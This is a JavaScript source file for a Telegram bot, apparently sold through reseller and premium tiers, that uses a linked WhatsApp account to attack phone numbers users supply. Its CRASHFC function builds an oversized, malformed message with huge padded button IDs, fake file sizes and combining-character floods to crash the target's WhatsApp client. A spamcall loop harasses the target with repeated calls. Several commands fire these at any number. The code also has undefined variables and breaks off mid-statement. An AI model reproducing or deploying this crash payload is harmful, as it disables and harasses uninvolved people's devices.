const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const global = require('./config.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let resellerUsers = JSON.parse(fs.readFileSync('./resseler.json'));
let superVip = JSON.parse(fs.readFileSync('./superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./security.json'));
const owner = global.owner;
const cooldowns = new Map();

console.log(`WhatsApp Bug Via Telegram By @Dev_Orzaa`)
let sock;
let whatsappStatus = false;
async function startWhatsapp() {
const { state, saveCreds } = await useMultiFileAuthState('permenmd');
sock = makeWASocket({
auth: state,
logger: P({ level: 'silent' }),
printQRInTerminal: false,
});
sock.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update;

if (connection === 'close') {
const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
if (reason && reason >= 500 && reason < 600 && reason === 428 && reason === 408 && reason === 429) {
whatsappStatus = false;
await getSessions(bot, chatId, number);
} else {
whatsappStatus = false;
}
} else if (connection === 'open') {
whatsappStatus = true;
}
})
};
async function getSessions(bot, chatId, number) {
const { state, saveCreds } = await useMultiFileAuthState('permenmd');
sock = makeWASocket({
auth: state,
logger: P({ level: 'silent' }),
printQRInTerminal: false,
});
sock.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update;

if (connection === 'close') {
const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
if (reason && reason >= 500 && reason < 600) {
whatsappStatus = false;
await bot.sendMessage(chatId, `${number} Reconnecting To WhatsApp`);
await getSessions(bot, chatId, number);
} else {
whatsappStatus = false;
await bot.sendMessage(chatId, `${number} Not Paired.`);
await fs.unlinkSync('./permenmd/creds.json'); 
}
} else if (connection === 'open') {
whatsappStatus = true;
bot.sendMessage(chatId, `${number} Connected to WhatsApp successfully!`);
}

if (connection === 'connecting') {
await new Promise(resolve => setTimeout(resolve, 1000));
try {
if (!fs.existsSync('./permenmd/creds.json')) {
const formattedNumber = number.replace(/\D/g, '');
const pairingCode = await sock.requestPairingCode(formattedNumber);
const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
bot.sendMessage(chatId, `${number} Pairing Code: ${formattedCode}`);
}
} catch (error) {
bot.sendMessage(chatId, `Error requesting pairing code: ${error.message}`);
}
}
});

sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
fs.writeFileSync('./superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
fs.writeFileSync('./banned.json', JSON.stringify(bannedUser, null, 2));
}
function saveReseller() {
fs.writeFileSync('./resseler.json', JSON.stringify(resellerUsers, null, 2));
}
function watchFile(filePath, updateCallback) {
fs.watch(filePath, (eventType) => {
if (eventType === 'change') {
try {
const updatedData = JSON.parse(fs.readFileSync(filePath));
updateCallback(updatedData);
console.log(`File ${filePath} updated successfully.`);
} catch (error) {
console.error(`Error updating ${filePath}:`, error.message);
}
}
});
}
watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));
watchFile('./resseler.json', (data) => (resellerUsers = data));
watchFile('./banned.json', (data) => (bannedUser = data));
watchFile('./superVip.json', (data) => (superVip = data));
watchFile('./security.json', (data) => (securityUser = data));
function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}

async function CRASHFC(target) {
const buttons = [{
buttonId: " ".repeat(101010), 
buttonText: { 
displayText: " ⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱ "
}
}, {
buttonId: " ".repeat(101010), 
buttonText: {
displayText: " ⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱ "
}
}, {
buttonId: " ".repeat(101000), 
buttonText: {
displayText: " ui "
}
}
]

let baruaMessage = {
botInvokeMessage: {
message: {
listResponseMessage: {
listType: 2,
singleSelectReply: {
selectedRowId: "S"
  },
document: { url: 'https://Luxzy.unaux.com' },
fileName: 'Luxzy',
mimetype: "application/vnd.oasis.opendocument.presentation",
fileLength: 9999999999999,
pageCount: 3567587327,
contextInfo: {
forwardingScore: 1920999,
isForwarded: true,
stanzaId: hamz.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedParticipant: `${target}@s.whatsapp.net`,// ID of participant who quoted a message
mentionedJid: [target, "0@s.whatsapp.net"],// Example mentioned user(s)
isDeleted: true,
persistent: true,
isEdited: true, 
isSpam: false, 
actionButton: {
url: "https://Luxzy.unaux.com",
label: "Take Action"
},
isGroupMessage: true,
isMediaMessage: true, 
previewType: "docx", 
isReplied: true,
disableNotifications: true,
externalAdReply: {
mediaUrl: 'https://Luxzy.unaux.com',
mediaType: 7,
previewType: "pdf",
title: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉" + " ".repeat(20000),
body: ' ̻̅ု𝐕͡𝐨͜𝐢͡𝐝͢𝐗͡𝐜͜𝐫͡𝐚͜𝐬͞𝐡🐉', 
thumbnail: TDX,
sourceUrl: 'FannyFa',
renderLargerThumbnail: false,
showAdAttribution: true,
containsAutoReply: true,
sourceId: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉",
ctwaClid: "cta_777_force_to_closed77",
ref: "ref_fanny_developer",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉",
ctaPayload: "cta_sex",
disableNudge: true,
originalImageUrl: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "FannyFa",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "",
caption: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
contentText: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉",
footerText: '⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱',
buttons: [
{
buttonId: " ".repeat(550000),
buttonText: {
displayText: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
type: 1
},
{
buttonId: " ".repeat(10101),
buttonText: {
displayText: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
type: 1
}
],
headerType: 3
}
},
quotedAd: {
advertiserName: " ∆ ",
mediaType: "IMAGE",
jpegThumbnail: TDX,
caption: "̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890",
},
expiration: -87700,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
show: true,
call: true,
actionLink: {
url: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉",
buttonTitle: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
disappearingMode:{
initiator:0,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363329486691279@newsletter",
serverMessageId: 7,
newsletterName: ` ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉${"ִྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི".repeat(10)}`,
contentType: 6,
content: "⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱",
timestamp: Date.now(),
sender: "777777777777777777@newsletter",
accessibilityText: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
},
statusAttributionType: 2,
extraParameters: {
userId: target,
campaignId: " ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉"
}
},
sendEphemeral: true
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: false,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
},
caption: "*ꦽꦾ*~".repeat(37000),
footer: ' ̻̅ု⇲ ͢𝄽𝐈͋͢𝐍ᯭ𝐍͢𝐎͢𝐕ᯭ𝐀͢ᯭ͋͢͢𝄽 ⇱🐉',
buttons: buttons,
headerType: 6,
  };
console.log(chalk.black(chalk.bgGreen('Ril : SendBug')));
return await hamz.relayMessage(target, baruaMessage, { 
participant: { 
jid: target
}}, {quoted: m});
}
async function spamcall(target) {
for (let i = 0; i <= 10; i++) {
await sock.offerCall(target);
await sleep(10000)
}
}
bot.onText(/\/start/, (msg) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
let ligma = `Hello ${senderName} 👋Halo Aku adalah Bot yang diciptakan Oleh Dilz Developer 
╭▱▱▱▱▱▱▱▱▱▱
╎Developer : @RealDilzXd
╎Partner : -
╰▱▱▱▱▱▱▱▱▱▱
WhatsApp Sender: ${whatsappStatus ? "Connected" : "Disconnected"}

╭▱▱▱▱▱▱▱▱▱▱
╎⺙〉 /xtroveui <number>
╎⺙〉 /trash <number>
╎⺙〉 /hit <number>
╎⺙〉 /trovetrash <number>
╎⺙〉 /xtrovebug <number>
╎⺙〉 /xtrovecall <number>
╎⺙〉 /lock <number>
╰▱▱▱▱▱▱▱▱▱▱▱
╭▱▱▱▱▱▱▱▱▱▱▱
╎⺙〉 /addadmin <id>
╎⺙〉 /deladmin <id>
╎⺙〉 /addreseller <id>
╎⺙〉 /delreseller <id>
╎⺙〉 /addprem <id>
╎⺙〉 /delprem <id>
╰▱▱▱▱▱▱▱▱▱▱▱
╭▱▱▱▱▱▱▱▱▱▱▱
╎⺙〉 /addreseller <id>
╎⺙〉 /delreseller <id>
╎⺙〉 /addprem <id>
╎⺙〉 /delprem <id>
╰▱▱▱▱▱▱▱▱▱▱▱
╭▱▱▱▱▱▱▱▱▱▱▱
╎ ⺙〉 /ban <id>
╎ ⺙〉 /unban <id>
╎ ⺙〉 /pairing <number>
╰▱▱▱▱▱▱▱▱▱▱▱
`;
bot.sendVideo(chatId, "https://files.catbox.moe/i7gwfb.mp4", {
caption: ligma,
reply_markup: {
inline_keyboard: [
[
{
text: "Owner「💬」",
url: "https://t.me/RealDilzXd"
},
{
text: "My Friend「🫣」",
callback_data: "thanksto"
}
]
]
}
});
});
bot.onText(/\/thanksto/, (msg) =>{
ctx.answerCbQuery();
const chatId = msg.chat.id;
const senderId = msg.from.id;
const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
let ligma = `Hello ${senderName} welcome to My Friend List.

Developer : @Osaka_Real
Partner : @Dev_Orzaa
__________________________________________
Thank You For Support Me : ( Orza )
__________________________________________
Name : Osaka
@RealDilzXd : ( Dev Subway-Xcrash )

Name : Sagara
@Sagara_Reals : ( My Friend )

Name : Dragnell
@dragneelreal ( My Friend )

Name : Iqbhal Keifer
@Vampiresagara : ( Dev Vampire ) 

Name : Orza
@Dev_Orzaa :( Partner Private Osaka )

`;
bot.sendVideo(chatId, "https://d.top4top.io/m_3285mchc71.mp4", {
caption: ligma,
reply_markup: {
inline_keyboard: [
[
{
text: "Owner「💬」",
url: "https://t.me/RealDilzXd"
},
]
]
}
});
});
bot.onText(/\/ban(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!securityUser.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesnt have access to this.")
}
if (!match[1]) {
return bot.sendMessage(chatId, "Example: /ban 62353541")
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (!/^\d+$/.test(userId)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
}

if (!bannedUser.includes(userId)) {
bannedUser.push(userId);
saveBanned();
console.log(`${senderId} Banned ${userId}`)
bot.sendMessage(chatId, `✅ User ${userId} has been banned.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is already banned.`);
}



})
bot.onText(/\/unban(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!securityUser.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesnt have access to this.")
}
if (!match[1]) {
return bot.sendMessage(chatId, "Example: /unban 62353541")
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (bannedUser.includes(userId)) {
bannedUser = bannedUser.filter(id => id !== userId);
savePremiumUsers();
console.log(`${senderId} unBannedd ${userId}`)
bot.sendMessage(chatId, `✅ User ${userId} has been unBannedd.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is already unBannedd.`);
}

})
bot.onText(/\/pairing(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!owner.includes(senderId)) {
return bot.sendMessage(chatId, "Only Owner can use this feature")
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a full args. Example: /pairing +628xxxx.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /pairing +628xxxx.");
}

await getSessions(bot, chatId, numberTarget)
});
bot.onText(/\/zoxxo(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}

const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);


if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /xtroveui +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /xtroveui +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using trove`)

});
bot.onText(/\/trash(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
  if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}


const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /trash +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /trash +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await CRASHFC(formatedNumber)
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using trash`)

});
bot.onText(/\/hit(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}


const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /hit +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /hit +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using hit`)

});
bot.onText(/\/trashzoxx(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}


const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /trovetrash +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /xtrobeta +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using zoxtr`)

});
bot.onText(/\/zoxobug(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}


const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /xtrovebug +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /xtrovebug +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using xtroveui`)

});
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !superVip.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to add admins.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (!/^\d+$/.test(userId)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
}

if (!adminUsers.includes(userId)) {
adminUsers.push(userId);
saveAdminUsers();
console.log(`${senderId} Added ${userId} To Admin`)
bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
}
});
bot.onText(/\/addreseller(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !superVip.includes(senderId) && adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to add reseller.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addreseller 6843967527.");
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (!/^\d+$/.test(userId)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /addreseller 6843967527.");
}

if (!resellerUsers.includes(userId)) {
resellerUsers.push(userId);
saveReseller();
console.log(`${senderId} Added ${userId} To reseller`)
bot.sendMessage(chatId, `✅ User ${userId} has been added as an reseller.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is already an reseller.`);
}
});
bot.onText(/\/delreseller(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !superVip.includes(senderId) && adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to remove reseller users.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /delreseller 6843967527.");
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (resellerUsers.includes(userId)) {
resellerUsers = resellerUsers.filter(id => id !== userId);
saveReseller();
console.log(`${senderId} Deleted ${userId} From Premium`)
bot.sendMessage(chatId, `✅ User ${userId} has been removed from the reseller.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is not a reseller user.`);
}
});
bot.onText(/\/deladmin(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !superVip.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to remove admins.");
}
if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
}
const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (adminUsers.includes(userId)) {
adminUsers = adminUsers.filter(id => id !== userId);
saveAdminUsers();
console.log(`${senderId} Deleted ${userId} From Admin`)
bot.sendMessage(chatId, `✅ User ${userId} has been removed from the admin list.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
}
});
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addprem 6843967527.");
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (!/^\d+$/.test(userId)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /addprem 6843967527.");
}

if (!premiumUsers.includes(userId)) {
premiumUsers.push(userId);
savePremiumUsers();
console.log(`${senderId} Added ${userId} To Premium`)
bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is already a premium user.`);
}
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;
if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId) && resellerUsers.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /delprem 6843967527.");
}

const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
if (premiumUsers.includes(userId)) {
premiumUsers = premiumUsers.filter(id => id !== userId);
savePremiumUsers();
console.log(`${senderId} Deleted ${userId} From Premium`)
bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
} else {
bot.sendMessage(chatId, `❌ User ${userId} is not a premium user.`);
}
});
bot.onText(/\/bug(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "❌ You are not a premium user.");
}

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Please provide a target number. Example: /lock +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /lock +628xxxx.");
}

const formatedNumber = `${numberTarget}@s.whatsapp.net`;

const options = {
reply_markup: {
inline_keyboard: [
[
{ text: "Crash UI", callback_data: `xtroveui:${formatedNumber}` },
{ text: "Crash News", callback_data: `trash:${formatedNumber}` }
],
[
{ text: "Crash IOS", callback_data: `hit:${formatedNumber}` },
{ text: "Crash Blank", callback_data: `trovecrash:${formatedNumber}` }
],
[
{ text: "Crash Beta", callback_data: `xtrovebug:${formatedNumber}` }
],
[
{ text: "Spam Call", callback_data: `xtrovecall:${formatedNumber}` }
]
]
}
};

